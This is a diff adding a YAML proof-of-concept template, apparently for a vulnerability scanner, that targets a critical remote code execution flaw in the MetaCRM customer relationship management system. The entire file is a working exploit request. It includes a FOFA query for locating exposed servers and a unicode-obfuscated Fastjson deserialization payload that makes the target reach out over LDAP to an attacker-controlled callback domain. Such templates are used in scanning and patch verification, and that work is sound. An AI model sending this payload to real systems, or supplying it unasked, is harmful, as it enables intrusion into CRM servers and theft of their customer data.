@@ -1,0 +1,20 @@
+id: poc-yaml-metacrm-remote-code-execution
+info:
+  name: MetaCRM客户关系管理系统 anothervalue 任意代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /eai/someValue/anotherValue
+  headers:
+    Content-Type: application/json
+  data: '{"b":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://{{.reverseDomain}}","autoCommit":true}}'
+  expression: reverse.Verify()
+transport: http
